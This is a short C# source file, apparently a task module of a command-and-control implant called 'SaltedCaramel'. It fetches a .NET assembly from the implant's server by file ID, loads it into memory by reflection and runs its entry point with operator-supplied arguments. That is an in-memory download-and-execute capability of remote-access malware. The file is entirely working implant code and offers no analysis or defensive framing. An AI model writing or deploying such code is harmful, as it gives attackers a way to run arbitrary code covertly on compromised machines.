using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using Reflection = System.Reflection;

namespace SaltedCaramel.Tasks
{
    class Assembly
    {
        internal static void Execute(SaltedCaramelTask task, SaltedCaramelImplant implant)
        {
            JObject json = (JObject)JsonConvert.DeserializeObject(task.@params);
            string file_id = json.Value<string>("file_id");
            string[] args = json.Value<string[]>("args");
            byte[] assemblyBytes = Upload.GetFile(file_id, implant);
            Reflection.Assembly assembly = Reflection.Assembly.Load(assemblyBytes);
            assembly.EntryPoint.Invoke(null, args);
        }
    }
}
